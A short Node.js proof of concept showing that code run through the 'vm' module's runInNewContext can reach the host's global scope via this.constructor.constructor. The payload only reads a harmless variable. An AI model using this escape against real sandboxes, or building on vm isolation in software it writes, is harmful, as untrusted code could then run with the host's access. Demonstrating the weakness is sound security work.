const vm = require('vm')
hehe = 123
const evil = `(this.constructor.constructor('return hehe'))()`
console.log(vm.runInNewContext(evil, {}))  // 123

